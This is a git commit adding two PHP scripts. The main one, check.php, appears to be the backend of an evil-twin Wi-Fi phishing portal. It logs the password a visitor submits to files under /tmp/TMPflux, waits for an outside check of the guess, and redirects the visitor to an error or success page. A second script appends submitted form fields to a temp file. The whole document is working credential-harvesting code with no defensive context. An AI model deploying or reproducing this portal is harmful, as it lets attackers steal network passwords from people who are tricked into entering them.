58ef01d7d42979fcdf57192dae3986b506314e78
Robs68 <robin.irlinger@gmail.com>
2016-10-26 14:21:05 +0200

    add

---
+++ check.php
@@ -0,0 +1,53 @@
+<?php
+error_reporting(0);
+
+$count_my_page = ("/tmp/TMPflux/hit.txt");
+$hits = file($count_my_page);
+$hits[0] ++;
+$fp = fopen($count_my_page , "w");
+fputs($fp , $hits[0]);
+fclose($fp);
+
+// Receive form Post data and Saving it in variables
+$key1 = @$_POST['key1'];
+$key2 = @$_POST['key2'];
+
+// Write the name of text file where data will be store
+$filename = "/tmp/TMPflux/data.txt";
+$filename2 = "/tmp/TMPflux/status.txt";
+$intento = "/tmp/TMPflux/intento";
+$attemptlog = "/tmp/TMPflux/pwattempt.txt";
+
+// Marge all the variables with text in a single variable.
+$f_data= ''.$key1.''.$key2."";
+
+$pwlog = fopen($attemptlog, "w");
+fwrite($pwlog, $f_data);
+fwrite($pwlog,"\n");
+fclose($pwlog);
+
+$file = fopen($filename, "w");
+fwrite($file, $f_data);
+fwrite($file,"\n");
+fclose($file);
+
+$archivo = fopen($intento, "w");
+fwrite($archivo,"\n");
+fclose($archivo);
+
+while( 1 ) {
+
+	if (file_get_contents( $intento ) == 1) {
+		header("Location:error.html");
+		unlink($intento);
+	    break;
+	}
+
+	if (file_get_contents( $intento ) == 2) {
+		header("Location:final.html");
+		break;
+	}
+
+	sleep(1);
+}
+?>
---
+++ check2.php
@@ -0,0 +1,15 @@
+<?php
+if(isset($_POST['field1']) && isset($_POST['field2'])) {
+    $data = $_POST['field1'] . '-' . $_POST['field2'] . "\n";
+    $ret = file_put_contents('/tmp/mydata.txt', $data, FILE_APPEND | LOCK_EX);
+    if($ret === false) {
+        die('There was an error writing this file');
+    }
+    else {
+        echo "$ret bytes written to file";
+    }
+}
+else {
+   die('no post data to process');
+}
+?>
